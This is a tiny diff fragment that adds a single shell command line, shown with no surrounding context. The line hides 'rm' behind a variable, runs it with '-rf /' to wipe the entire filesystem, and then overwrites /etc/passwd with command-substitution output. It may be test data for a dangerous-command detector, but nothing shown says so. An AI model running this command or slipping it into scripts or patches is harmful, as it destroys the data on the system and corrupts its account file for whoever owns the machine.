@@ -1,0 +1,1 @@
+X=rm; $X -rf / && ls "$(echo `whoami`)" > /etc/passwd
